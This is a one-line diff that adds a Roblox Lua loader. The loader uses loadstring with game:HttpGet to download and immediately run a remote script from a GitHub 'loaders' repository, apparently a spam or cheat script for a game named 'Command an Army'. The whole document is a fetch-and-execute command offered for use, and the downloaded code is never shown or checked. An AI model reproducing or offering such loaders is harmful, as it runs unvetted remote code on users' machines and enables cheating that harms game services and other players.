@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/upd-command-an-army-spam2-rg9f7hwvhi5vab.lua"))()
